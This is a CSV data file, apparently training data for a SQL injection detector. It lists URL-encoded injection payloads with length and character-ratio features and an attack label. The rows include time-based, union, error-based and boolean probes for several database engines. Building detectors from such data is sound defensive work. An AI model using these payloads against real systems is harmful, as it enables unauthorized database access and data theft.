payload,payload_len,alpha,non_alpha,attack_feature,label
-5355%22%20or%20make_set%289354%3D9354%2C7185%29,34,79.41176470588235,20.588235294117645,30000.0,1
1%27%29%29%20and%20%28select%202%2A%28if%28%28select%20%2A%20from%20%28select%20concat%280x7171706a71%2C%28select%20%28elt%283484%3D3484%2C1%29%29%29%2C0x717a767a71%2C0x78%29%29s%29%2C%208446744073709551610%2C%208446744073709551610%29%29%29%20and%20%28%28%27yzdp%27%3D%27yzdp,179,79.88826815642457,20.11173184357542,90000.0,1
1%27%2B%28select%20%27mdiu%27%20where%204443%3D4443%3Bselect%20benchmark%285000000%2Cmd5%280x4c4d6142%29%29%29%2B%27,78,80.76923076923077,19.230769230769234,30000.0,1
-8772%25%27%20union%20all%20select%204909%2C4909%2C4909%2C4909%2C4909%2C4909%2C4909%2C4909%2C4909%23,70,82.85714285714286,17.142857142857142,60000.0,1
1%22%20and%208148%3Dlike%28%27abcdefg%27%2Cupper%28hex%28randomblob%28500000000/2%29%29%29%29--,65,75.38461538461539,24.615384615384617,39000.0,1
1%22%29%20as%20fcrx%20where%202929%3D2929%20and%202820%3D5133,41,90.2439024390244,9.75609756097561,60000.0,1
1%22%29%29%20as%20tgwp%20where%209405%3D9405%3Bselect%20count%28%2A%29%20from%20rdb%24fields%20as%20t1%2Crdb%24types%20as%20t2%2Crdb%24collations%20as%20t3%2Crdb%24functions%20as%20t4--,125,86.4,13.600000000000001,60000.0,1
1%27%20rlike%20%28select%20%28case%20when%20%287689%3D7689%29%20then%201%20else%200x28%20end%29%29%20and%20%27xnap%27%3D%27xnap,79,84.81012658227847,15.18987341772152,30000.0,1
1%27%29%29%20and%207533%3D7533%20and%20%28%28%27ialm%27%3D%27ialm,37,72.97297297297297,27.027027027027028,60000.0,1
1%29%29%20as%20vmwj%20where%205597%3D5597%3Biif%285257%3D5257%2C1%2C1/0%29,48,79.16666666666666,20.833333333333336,30000.0,1
-5918%27%29%20as%20olzc%20where%205992%3D5992%20or%204390%3D9085,44,88.63636363636364,11.363636363636363,60000.0,1
1%25%22%29%3Bselect%20count%28%2A%29%20from%20all_users%20t1%2Call_users%20t2%2Call_users%20t3%2Call_users%20t4%2Call_users%20t5%20and%20%28%22%25%22%3D%22,101,78.21782178217822,21.782178217821784,60000.0,1
1%20where%201776%3D1776%20and%20char%28107%29%7C%7Cchar%28121%29%7C%7Cchar%2897%29%7C%7Cchar%2880%29%3Dregexp_substring%28repeat%28left%28crypt_key%28char%2865%29%7C%7Cchar%2869%29%7C%7Cchar%2883%29%2Cnull%29%2C0%29%2C500000000%29%2Cnull%29--,158,73.41772151898735,26.582278481012654,60000.0,1
1%22%29%29%20and%20%283020%3D3020%29%2A6703%20and%20%28%28%22njdx%22%20like%20%22njdx,49,75.51020408163265,24.489795918367346,90000.0,1
1%25%22%29%29%29%20and%204386%3Dutl_inaddr.get_host_address%28chr%28113%29%7C%7Cchr%28113%29%7C%7Cchr%28112%29%7C%7Cchr%28106%29%7C%7Cchr%28113%29%7C%7C%28select%20%28case%20when%20%284386%3D4386%29%20then%201%20else%200%20end%29%20from%20dual%29%7C%7Cchr%28113%29%7C%7Cchr%28122%29%7C%7Cchr%28118%29%7C%7Cchr%28122%29%7C%7Cchr%28113%29%29%20and%20%28%28%28%22%25%22%3D%22,218,69.26605504587155,30.73394495412844,90000.0,1
-4817%20union%20all%20select%207415%2C7415%2C7415%2C7415%2C7415%2C7415%2C7415%2C7415%2C7415%23,68,85.29411764705883,14.705882352941178,60000.0,1
1%25%27%29%29%29%3Bselect%20count%28%2A%29%20from%20sysibm.systables%20as%20t1%2Csysibm.systables%20as%20t2%2Csysibm.systables%20as%20t3%20and%20%28%28%28%27%25%27%3D%27,109,79.81651376146789,20.18348623853211,60000.0,1
1%29%20as%20ryks%20where%201196%3D1196%3Bselect%20%28case%20when%20%281005%3D5996%29%20then%201%20else%201005%2A%28select%201005%20from%20master..sysdatabases%29%20end%29--,120,87.5,12.5,60000.0,1
1%22%29%29%20as%20lomw%20where%209257%3D9257%20union%20all%20select%20null%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull--,77,85.71428571428571,14.285714285714285,90000.0,1
1%25%22%29%29%29%3Bselect%20dbms_pipe.receive_message%28chr%28112%29%7C%7Cchr%2870%29%7C%7Cchr%28106%29%7C%7Cchr%2878%29%2C5%29%20from%20dual--,91,69.23076923076923,30.76923076923077,30000.0,1
1%27%20where%208864%3D8864%3Bselect%20count%28%2A%29%20from%20sysibm.systables%20as%20t1%2Csysibm.systables%20as%20t2%2Csysibm.systables%20as%20t3--,110,88.18181818181819,11.818181818181818,60000.0,1
1%27%29%20where%207391%3D7391%20or%20%28select%209173%20from%28select%20count%28%2A%29%2Cconcat%280x7171706a71%2C%28select%20%28elt%289173%3D9173%2C1%29%29%29%2C0x717a767a71%2Cfloor%28rand%280%29%2A2%29%29x%20from%20information_schema.character_sets%20group%20by%20x%29a%29--,191,82.19895287958116,17.801047120418847,90000.0,1
1%20where%202384%3D2384%20and%20%28select%20%2A%20from%20%28select%28sleep%285%29%29%29gcrr%29%23,61,81.9672131147541,18.0327868852459,90000.0,1
-3805%22%29%29%29%20union%20all%20select%209123%2C9123%2C9123%2C9123%2C9123%2C9123%2C9123%2C9123%23,67,80.59701492537313,19.402985074626866,60000.0,1
1%27%20in%20boolean%20mode%29%20or%206979%3Dlike%28%27abcdefg%27%2Cupper%28hex%28randomblob%28500000000/2%29%29%29%29--,81,79.01234567901234,20.98765432098765,39000.0,1
1%27%29%29%3Bcreate%20or%20replace%20function%20sleep%28int%29%20returns%20int%20as%20%27/lib/libc.so.6%27%2C%27sleep%27%20language%20%27c%27%20strict%3B%20select%20sleep%285%29%20and%20%28%28%27uyft%27%3D%27uyft,138,81.15942028985508,18.84057971014493,90000.0,1
-4055%27%29%29%20as%20yoez%20where%203816%3D3816%20or%20%288459%3D8459%29%2A4906--,54,79.62962962962963,20.37037037037037,60000.0,1
1%27%7C%7C%28select%20%27ysij%27%20from%20dual%20where%206140%3D6140%20procedure%20analyse%28extractvalue%289255%2Cconcat%280x5c%2C%28benchmark%285000000%2Cmd5%280x52515a50%29%29%29%29%29%2C1%29%29%7C%7C%27,138,80.43478260869566,19.565217391304348,60000.0,1
-2962%27%29%29%29%20or%201570%3Dconvert%28int%2C%28select%20char%28113%29%2Bchar%28113%29%2Bchar%28112%29%2Bchar%28106%29%2Bchar%28113%29%2B%28select%20%28case%20when%20%281570%3D1570%29%20then%20char%2849%29%20else%20char%2848%29%20end%29%29%2Bchar%28113,224,55.35714285714286,16.517857142857142,30000.0,1
1%27%2B%28select%20%27qmtx%27%20where%206992%3D6992%20and%208148%3Dlike%28%27abcdefg%27%2Cupper%28hex%28randomblob%28500000000/2%29%29%29%29--,96,78.125,21.875,69000.0,1
1%29%3Bbegin%20dbms_lock.sleep%285%29%3B%20end,32,84.375,15.625,18.51851851851852,1
1%27%2B%28select%20dklj%20where%203265%3D3265%3Bselect%20sleep%285%29%23,48,83.33333333333334,16.666666666666664,30000.0,1
1%20where%203410%3D3410%20or%207552%3D%28select%20count%28%2A%29%20from%20rdb%24fields%20as%20t1%2Crdb%24types%20as%20t2%2Crdb%24collations%20as%20t3%2Crdb%24functions%20as%20t4%29--,124,87.09677419354838,12.903225806451612,90000.0,1
-4596%22%20union%20all%20select%205761%23,29,89.65517241379311,10.344827586206897,60000.0,1
1%22%29%29%3Bwaitfor%20delay%20%270%3A0%3A5%27%20and%20%28%28%22zili%22%20like%20%22zili,50,74.0,26.0,90000.0,1
1%25%22%29%29%3Bselect%20%28case%20when%20%284666%3D4666%29%20then%201%20else%204666%2A%28select%204666%20from%20master..sysdatabases%29%20end%29--,99,82.82828282828282,17.17171717171717,30000.0,1
1%22%29%29%20as%20jgie%20where%208017%3D8017%20and%20%28select%20%2A%20from%20%28select%28sleep%285%29%29%29fzno%29--,73,79.45205479452055,20.54794520547945,90000.0,1
1%22%29%29%20or%20extractvalue%281297%2Cconcat%280x5c%2C0x7171706a71%2C%28select%20%28elt%281297%3D1297%2C1%29%29%29%2C0x717a767a71%29%29%20and%20%28%28%22pebw%22%20like%20%22pebw,117,79.48717948717949,20.51282051282051,90000.0,1
1%27%29%29%20as%20yyja%20where%204321%3D4321%20or%208315%3D%28select%20count%28%2A%29%20from%20sysibm.systables%20as%20t1%2Csysibm.systables%20as%20t2%2Csysibm.systables%20as%20t3%29--,130,86.92307692307692,13.076923076923078,90000.0,1
1%27%2B%28select%20%27arzm%27%20where%206464%3D6464%20or%208466%3Dbenchmark%285000000%2Cmd5%280x694a4745%29%29%29%2B%27,79,81.0126582278481,18.9873417721519,60000.0,1
1%25%27%20and%209254%3D%28select%20count%28%2A%29%20from%20rdb%24fields%20as%20t1%2Crdb%24types%20as%20t2%2Crdb%24collations%20as%20t3%2Crdb%24functions%20as%20t4%29--,111,84.68468468468468,15.315315315315313,60000.0,1
-3081%22%29%29%29%20or%203736%3D1899,22,72.72727272727273,27.27272727272727,30000.0,1
1%27%29%29%20as%20umah%20where%203781%3D3781%20union%20all%20select%20null%2Cnull%2Cnull%2Cnull%23,66,87.87878787878788,12.121212121212121,90000.0,1
-3090%22%20or%20make_set%289354%3D9354%2C7185%29%20and%20%22qowe%22%20like%20%22qowe,56,82.14285714285714,17.857142857142858,90000.0,1
1%27%20and%20%283020%3D3020%29%2A6703,23,78.26086956521739,21.73913043478261,30000.0,1
-4082%29%29%20or%205903%3D%28%27qqpjq%27%7C%7C%28select%20case%205903%20when%205903%20then%201%20else%200%20end%20from%20rdb%24database%29%7C%7C%27qzvzq%27%29%20and%20%28%287874%3D7874,116,82.75862068965517,17.24137931034483,90000.0,1
1%22%29%20where%206311%3D6311%3Bselect%20%2A%20from%20generate_series%284592%2C4592%2Ccase%20when%20%284592%3D4592%29%20then%201%20else%200%20end%29%20limit%201--,110,86.36363636363636,13.636363636363635,60000.0,1
1%29%20where%204573%3D4573%3Bselect%20count%28%2A%29%20from%20all_users%20t1%2Call_users%20t2%2Call_users%20t3%2Call_users%20t4%2Call_users%20t5--,106,83.9622641509434,16.037735849056602,60000.0,1
1%3Bselect%20count%28%2A%29%20from%20sysibm.systables%20as%20t1%2Csysibm.systables%20as%20t2%2Csysibm.systables%20as%20t3--,93,88.17204301075269,11.827956989247312,30000.0,1
1%27%29%29%20as%20bewk%20where%203672%3D3672%20or%20sleep%285%29--,42,80.95238095238095,19.047619047619047,60000.0,1
1%27%20in%20boolean%20mode%29%20and%203707%3D%28select%20count%28%2A%29%20from%20sysibm.systables%20as%20t1%2Csysibm.systables%20as%20t2%2Csysibm.systables%20as%20t3%29%23,121,88.42975206611571,11.570247933884298,60000.0,1
1%25%27%20or%20char%28119%29%7C%7Cchar%28100%29%7C%7Cchar%2899%29%7C%7Cchar%28121%29%3Dregexp_substring%28repeat%28right%28char%281441%29%2C0%29%2C5000000000%29%2Cnull%29--,112,72.32142857142857,27.67857142857143,30000.0,1
1%29%29%29%20or%20exp%28~%28select%20%2A%20from%20%28select%20concat%280x7171706a71%2C%28select%20%28elt%286270%3D6270%2C1%29%29%29%2C0x717a767a71%2C0x78%29%29x%29%29%20and%20%28%28%282230%3D2230,123,77.23577235772358,21.951219512195124,90000.0,1
-8301%27%29%20union%20all%20select%201806%2C1806--,36,83.33333333333334,16.666666666666664,60000.0,1
1%27%29%20or%20char%28117%29%7C%7Cchar%28111%29%7C%7Cchar%28105%29%7C%7Cchar%28100%29%3Dregexp_substring%28repeat%28left%28crypt_key%28char%2865%29%7C%7Cchar%2869%29%7C%7Cchar%2883%29%2Cnull%29%2C0%29%2C500000000%29%2Cnull%29%20and%20%28%27tvcm%27%3D%27tvcm,161,71.42857142857143,28.57142857142857,60000.0,1
1%25%22%29%29%29%20or%208156%3D%28select%20count%28%2A%29%20from%20generate_series%281%2C5000000%29%29--,66,74.24242424242425,25.757575757575758,60000.0,1
-8729%27%2B%28select%20%27nbzl%27%20where%207160%3D7160%20order%20by%201%23,49,83.6734693877551,16.3265306122449,60000.0,1
-4713%27%29%29%29%20or%204567%3D1287,22,72.72727272727273,27.27272727272727,30000.0,1
1%22%29%3Bselect%20count%28%2A%29%20from%20rdb%24fields%20as%20t1%2Crdb%24types%20as%20t2%2Crdb%24collations%20as%20t3%2Crdb%24functions%20as%20t4%20and%20%28%22yobb%22%20like%20%22yobb,121,85.9504132231405,14.049586776859504,90000.0,1
1%27%2B%28select%20%27stdl%27%20where%204581%3D4581%3Biif%287953%3D3021%2C1%2C1/0%29,54,75.92592592592592,24.074074074074073,30000.0,1
-5217%20where%203620%3D3620%20or%203440%3Dcast%28%28chr%28113%29%7C%7Cchr%28113%29%7C%7Cchr%28112%29%7C%7Cchr%28106%29%7C%7Cchr%28113%29%29%7C%7C%28select%20%28case%20when%20%283440%3D3440%29%20then%201%20else%200%20end%29%29%3A%3Atext%7C%7C%28chr%28113%2,209,55.02392344497608,19.138755980861244,60000.0,1
1%25%22%29%29%29%20or%208384%3Dlike%28%27abcdefg%27%2Cupper%28hex%28randomblob%28500000000/2%29%29%29%29%20and%20%28%28%28%22%25%22%3D%22,79,67.08860759493672,32.91139240506329,69000.0,1
-7772%27%29%29%20or%209323%3D9323%23,22,72.72727272727273,27.27272727272727,30000.0,1
1%22%29%29%29%28select%20%28case%20when%20%285451%3D5451%29%20then%20regexp_substring%28repeat%28right%28char%285451%29%2C0%29%2C500000000%29%2Cnull%29%20else%20char%28108%29%7C%7Cchar%2876%29%7C%7Cchar%28112%29%7C%7Cchar%28116%29%20end%29%20from%20information_schema.system_users%29%20and%20%28%28%28%22znzb%22%20like%20%22znzb,216,78.70370370370371,21.296296296296298,90000.0,1
%28select%20%28case%20when%20%283531%3D3531%29%20then%20%28select%20count%28%2A%29%20from%20sysusers%20as%20sys1%2Csysusers%20as%20sys2%2Csysusers%20as%20sys3%2Csysusers%20as%20sys4%2Csysusers%20as%20sys5%2Csysusers%20as%20sys6%2Csysusers%20as%20sys7%29%20else%203531%20end%29%29,193,90.67357512953367,9.32642487046632,30000.0,1
1%3Bselect%20like%28%27abcdefg%27%2Cupper%28hex%28randomblob%28500000000/2%29%29%29%29%23%20lchh,66,78.78787878787878,21.21212121212121,9000.0,1
-8294%25%27%20union%20all%20select%208728%2C8728%2C8728%2C8728%2C8728%2C8728%2C8728%2C8728%2C8728%2C8728%23,75,82.66666666666667,17.333333333333336,60000.0,1
1%27%2B%28select%20ejaj%20where%201651%3D1651%20or%206793%3D%28select%206793%20from%20pg_sleep%285%29%29%29%2B%27,73,82.1917808219178,17.80821917808219,90000.0,1
1%22%29%29%3Bselect%20benchmark%285000000%2Cmd5%280x4c4d6142%29%29%20and%20%28%28%22uhvy%22%3D%22uhvy,65,76.92307692307693,23.076923076923077,30000.0,1
1%27%29%20procedure%20analyse%28extractvalue%289255%2Cconcat%280x5c%2C%28benchmark%285000000%2Cmd5%280x52515a50%29%29%29%29%29%2C1%29,93,84.94623655913979,15.053763440860209,17.721518987341764,1
-4798%22%29%29%29%20union%20all%20select%207892%2C7892%2C7892%2C7892%2C7892%2C7892%2C7892%2C7892%2C7892%2C7892%23,77,80.51948051948052,19.480519480519483,60000.0,1
1%20or%20char%28117%29%7C%7Cchar%28111%29%7C%7Cchar%28105%29%7C%7Cchar%28100%29%3Dregexp_substring%28repeat%28left%28crypt_key%28char%2865%29%7C%7Cchar%2869%29%7C%7Cchar%2883%29%2Cnull%29%2C0%29%2C500000000%29%2Cnull%29%23%20utdm,147,72.78911564625851,27.2108843537415,30000.0,1
-2992%25%27%29%29%29%20or%204493%3Dutl_inaddr.get_host_address%28chr%28113%29%7C%7Cchr%28113%29%7C%7Cchr%28112%29%7C%7Cchr%28106%29%7C%7Cchr%28113%29%7C%7C%28select%20%28case%20when%20%284493%3D4493%29%20then%201%20else%200%20end%29%20from%20dual%29%7C%7C,221,53.39366515837104,18.552036199095024,60000.0,1
-9928%22%29%29%20union%20all%20select%207511%2C7511%2C7511%2C7511%2C7511%2C7511%2C7511%2C7511%23,66,81.81818181818183,18.181818181818183,60000.0,1
1%29%20where%201443%3D1443%20union%20all%20select%20null%2Cnull%2Cnull%2Cnull%2Cnull%23,61,88.52459016393442,11.475409836065573,90000.0,1
-1662%20where%201119%3D1119%20or%20%288459%3D8459%29%2A4906--,43,81.3953488372093,18.6046511627907,60000.0,1
1%27%2B%28select%20%27iyyv%27%20where%209500%3D9500%20or%20%28select%20%2A%20from%20%28select%28sleep%285%29%29%29ydpu%29%29%2B%27,78,76.92307692307693,23.076923076923077,90000.0,1
1%22%20where%206501%3D6501%3Bselect%20%28case%20when%20%283855%3D3855%29%20then%203855%20else%201/%28select%200%29%20end%29--,83,84.33734939759037,15.66265060240964,30000.0,1
1%25%27%20union%20all%20select%20null%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull--,52,82.6923076923077,17.307692307692307,60000.0,1
1%25%22%29%3Bselect%20%28case%20when%20%284769%3D4769%29%20then%204769%20else%204769%2A%28select%204769%20from%20mysql.db%29%20end%29%23,88,84.0909090909091,15.909090909090908,30000.0,1
1%25%27%29%29%29%3Bselect%20like%28%27abcdefg%27%2Cupper%28hex%28randomblob%28500000000/2%29%29%29%29%20and%20%28%28%28%27%25%27%3D%27,78,66.66666666666666,33.33333333333333,39000.0,1
1%22%29%29%20as%20knyf%20where%208109%3D8109%20or%208384%3Dlike%28%27abcdefg%27%2Cupper%28hex%28randomblob%28500000000/2%29%29%29%29--,90,78.88888888888889,21.11111111111111,69000.0,1
1%27%20where%206721%3D6721%20union%20all%20select%20null%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%23,86,86.04651162790698,13.953488372093023,90000.0,1
1%22%29%29%29%3Bselect%20count%28%2A%29%20from%20generate_series%281%2C5000000%29--,55,74.54545454545455,25.454545454545453,30000.0,1
1%27%20and%207533%3D7533%20and%20%27jwgc%27%3D%27jwgc,33,81.81818181818183,18.181818181818183,60000.0,1
-2748%27%29%29%20as%20gazw%20where%204624%3D4624%20union%20all%20select%204624%2C4624%23,60,88.33333333333333,11.666666666666666,90000.0,1
1%22%29%3Bwaitfor%20delay%20%270%3A0%3A5%27--,27,66.66666666666666,33.33333333333333,30000.0,1
-7333%25%22%29%29%29%20or%205903%3D%28%27qqpjq%27%7C%7C%28select%20case%205903%20when%205903%20then%201%20else%200%20end%20from%20rdb%24database%29%7C%7C%27qzvzq%27%29%20and%20%28%28%28%22%25%22%3D%22,116,75.86206896551724,24.137931034482758,90000.0,1
1%27%2B%28select%20%27lawc%27%20where%201171%3D1171%20or%208156%3D%28select%20count%28%2A%29%20from%20generate_series%281%2C5000000%29%29--,93,80.64516129032258,19.35483870967742,90000.0,1
1%22%29%20as%20ztkr%20where%201532%3D1532%3Bselect%20%28case%20when%20%284769%3D4769%29%20then%204769%20else%204769%2A%28select%204769%20from%20mysql.db%29%20end%29%23,111,87.38738738738738,12.612612612612612,60000.0,1
1%27%20where%201895%3D1895%20or%205286%3D%28select%20count%28%2A%29%20from%20all_users%20t1%2Call_users%20t2%2Call_users%20t3%2Call_users%20t4%2Call_users%20t5%29--,116,83.62068965517241,16.379310344827587,90000.0,1
-3270%25%27%20or%20elt%289404%3D3498%2C3498%29%20and%20%27%25%27%3D%27,40,70.0,30.0,60000.0,1
1%22%29%29%29%20union%20all%20select%20null%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%23,63,80.95238095238095,19.047619047619047,60000.0,1
1%22%29%29%20rlike%20%28select%20%2A%20from%20%28select%28sleep%285%29%29%29vwyq%29%23,50,74.0,26.0,30000.0,1
-4324%20order%20by%201--,18,83.33333333333334,16.666666666666664,30000.0,1
1%29%20as%20ndgd%20where%202367%3D2367%20or%208156%3D%28select%20count%28%2A%29%20from%20generate_series%281%2C5000000%29%29--,86,83.72093023255815,16.27906976744186,90000.0,1
1%22%20where%201831%3D1831%20and%20%28select%20%2A%20from%20%28select%28sleep%285%29%29%29gcrr%29%23,62,80.64516129032258,19.35483870967742,90000.0,1
1%29%29%20as%20ztcn%20where%201043%3D1043%20and%206305%3D5785--,43,86.04651162790698,13.953488372093023,60000.0,1
1%22%29%29%20and%208514%3D%28select%20count%28%2A%29%20from%20domain.domains%20as%20t1%2Cdomain.columns%20as%20t2%2Cdomain.tables%20as%20t3%29%20and%20%28%28%22opgb%22%20like%20%22opgb,122,84.42622950819673,15.573770491803279,120000.0,1
-6984%20order%20by%201%23,17,88.23529411764706,11.76470588235294,30000.0,1
1%29%20or%206979%3Dlike%28%27abcdefg%27%2Cupper%28hex%28randomblob%28500000000/2%29%29%29%29--,64,75.0,25.0,39000.0,1
1%27%29%29%20union%20all%20select%20null%2Cnull%2Cnull%23,37,83.78378378378379,16.216216216216218,60000.0,1
1%27%29%20and%206055%3Dctxsys.drithsx.sn%286055%2C%28chr%28113%29%7C%7Cchr%28113%29%7C%7Cchr%28112%29%7C%7Cchr%28106%29%7C%7Cchr%28113%29%7C%7C%28select%20%28case%20when%20%286055%3D6055%29%20then%201%20else%200%20end%29%20from%20dual%29%7C%7Cchr%28113%29%7C%7Cchr%28122%29%7C%7Cchr%28118%29%7C%7Cchr%28122%29%7C%7Cchr%28113%29%29%29%20and%20%28%27xhez%27%20like%20%27xhez,222,72.52252252252252,27.47747747747748,120000.0,1
-9212%20or%201026%3D7967%23,19,84.21052631578947,15.789473684210526,30000.0,1
1%22%29%20where%209020%3D9020%20or%20row%281045%2C7562%29%3E%28select%20count%28%2A%29%2Cconcat%280x7171706a71%2C%28select%20%28elt%281045%3D1045%2C1%29%29%29%2C0x717a767a71%2Cfloor%28rand%280%29%2A2%29%29x%20from%20%28select%208488%20union%20select%205584%20union%20select%203051%20union%20select%201210%29a%20group%20by%20x%29--,222,84.23423423423422,15.765765765765765,270000.0,1
1%20and%20elt%281210%3D1210%2Csleep%285%29%29%23%20macc,35,80.0,20.0,30000.0,1
1%22%29%29%29%20or%207552%3D%28select%20count%28%2A%29%20from%20rdb%24fields%20as%20t1%2Crdb%24types%20as%20t2%2Crdb%24collations%20as%20t3%2Crdb%24functions%20as%20t4%29%20and%20%28%28%28%22atlz%22%3D%22atlz,130,81.53846153846153,18.461538461538463,90000.0,1
1%22%29%29%20union%20all%20select%20null%2Cnull%2Cnull%2Cnull--,43,81.3953488372093,18.6046511627907,60000.0,1
1%29%20where%202223%3D2223%3B%28select%20%2A%20from%20%28select%28sleep%285%29%29%29acdk%29%23,58,77.58620689655173,22.413793103448278,60000.0,1
1%29%29%29%3Bselect%20count%28%2A%29%20from%20generate_series%281%2C5000000%29%20and%20%28%28%281321%3D1321,69,78.26086956521739,21.73913043478261,60000.0,1
1%27%29%29%20or%20char%2875%29%7C%7Cchar%2870%29%7C%7Cchar%2899%29%7C%7Cchar%2883%29%3Dregexp_substring%28repeat%28left%28crypt_key%28char%2865%29%7C%7Cchar%2869%29%7C%7Cchar%2883%29%2Cnull%29%2C0%29%2C500000000%29%2Cnull%29--,142,69.01408450704226,30.985915492957744,30000.0,1
1%27%2B%28select%20fhbk%20where%202570%3D2570%20and%205556%3D%28select%20count%28%2A%29%20from%20all_users%20t1%2Call_users%20t2%2Call_users%20t3%2Call_users%20t4%2Call_users%20t5%29%29%2B%27,131,83.20610687022901,16.793893129770993,90000.0,1
1%25%22%29%20and%20extractvalue%287982%2Cconcat%280x5c%2C0x7171706a71%2C%28select%20%28elt%287982%3D7982%2C1%29%29%29%2C0x717a767a71%29%29%20and%20%28%22%25%22%3D%22,105,76.19047619047619,23.809523809523807,60000.0,1
1%27%29%20rlike%20%28select%20%28case%20when%20%287689%3D7689%29%20then%201%20else%200x28%20end%29%29%20and%20%28%27ejnt%27%20like%20%27ejnt,86,84.88372093023256,15.11627906976744,60000.0,1
-7255%27%20union%20all%20select%202127%2C2127%2C2127%2C2127%2C2127%23,49,85.71428571428571,14.285714285714285,60000.0,1
1%27%20in%20boolean%20mode%29%20order%20by%201--,32,87.5,12.5,30000.0,1
1%27%7C%7C%28select%20%27dyuw%27%20from%20dual%20where%202037%3D2037%3Bcall%20regexp_substring%28repeat%28left%28crypt_key%28char%2865%29%7C%7Cchar%2869%29%7C%7Cchar%2883%29%2Cnull%29%2C0%29%2C500000000%29%2Cnull%29--,145,76.55172413793103,23.448275862068964,60000.0,1
1%29%20as%20xylu%20where%203338%3D3338%20rlike%20%28select%20%2A%20from%20%28select%28sleep%285%29%29%29sgvo%29--,73,82.1917808219178,17.80821917808219,60000.0,1
1%22%29%29%3Bselect%20count%28%2A%29%20from%20generate_series%281%2C5000000%29%20and%20%28%28%22bhmu%22%20like%20%22bhmu,76,78.94736842105263,21.052631578947366,90000.0,1
-3525%22%20where%203522%3D3522%20union%20all%20select%203522%2C3522%2C3522%2C3522%2C3522%2C3522%2C3522%2C3522%2C3522%23,85,85.88235294117646,14.117647058823529,90000.0,1
1%22%29%29%20as%20nncz%20where%202331%3D2331%3Bselect%20case%20when%206420%3D7941%20then%201%20else%20null%20end--,78,89.74358974358975,10.256410256410255,30000.0,1
1%29%20as%20iovi%20where%203910%3D3910%20or%205356%3D%28select%20count%28%2A%29%20from%20sysusers%20as%20sys1%2Csysusers%20as%20sys2%2Csysusers%20as%20sys3%2Csysusers%20as%20sys4%2Csysusers%20as%20sys5%2Csysusers%20as%20sys6%2Csysusers%20as%20sys7%29--,178,91.01123595505618,8.98876404494382,90000.0,1
1%22%29%20or%206793%3D%28select%206793%20from%20pg_sleep%285%29%29%20and%20%28%22lsis%22%20like%20%22lsis,65,81.53846153846153,18.461538461538463,120000.0,1
-8331%27%29%20union%20all%20select%201452%2C1452%2C1452%2C1452%2C1452--,51,82.35294117647058,17.647058823529413,60000.0,1
1%27%29%20and%208594%3D%28select%208594%20from%20pg_sleep%285%29%29--,45,77.77777777777779,22.22222222222222,60000.0,1
-6775%22%20union%20all%20select%207484%2C7484%23,34,88.23529411764706,11.76470588235294,60000.0,1
1%22%29%29%20as%20tkmd%20where%203415%3D3415%20and%20%28select%202%2A%28if%28%28select%20%2A%20from%20%28select%20concat%280x7171706a71%2C%28select%20%28elt%283484%3D3484%2C1%29%29%29%2C0x717a767a71%2C0x78%29%29s%29%2C%208446744073709551610%2C%208446744073709551610%29%29%29--,186,82.25806451612904,17.741935483870968,90000.0,1
1%29%29%29%20or%208156%3D%28select%20count%28%2A%29%20from%20generate_series%281%2C5000000%29%29--,64,76.5625,23.4375,60000.0,1
1%27%29%29%20or%205286%3D%28select%20count%28%2A%29%20from%20all_users%20t1%2Call_users%20t2%2Call_users%20t3%2Call_users%20t4%2Call_users%20t5%29%20and%20%28%28%27fvov%27%3D%27fvov,119,79.83193277310924,20.168067226890756,90000.0,1
1%2C%28begin%20if%20%288340%3D8340%29%20then%20dbms_lock.sleep%285%29%3B%20else%20dbms_lock.sleep%280%29%3B%20end%20if%3B%20end%3B%29,87,86.20689655172413,13.793103448275872,16.000000000000014,1
1%27%29%29%29%20and%203754%3D%28select%20upper%28xmltype%28chr%2860%29%7C%7Cchr%2858%29%7C%7Cchr%28113%29%7C%7Cchr%28113%29%7C%7Cchr%28112%29%7C%7Cchr%28106%29%7C%7Cchr%28113%29%7C%7C%28select%20%28case%20when%20%283754%3D3754%29%20then%201%20else%200%20end%29%20from%20dual%29%7C%7Cchr%28113%29%7C%7Cchr%28122%29%7C%7Cchr%28118%29%7C%7Cchr%28122%29%7C%7Cchr%28113%29%7C%7Cchr%2862%29%29%29%20from%20dual%29%20and%20%28%28%28%27ykjs%27%20like%20%27ykjs,262,70.99236641221374,29.00763358778626,159000.0,1
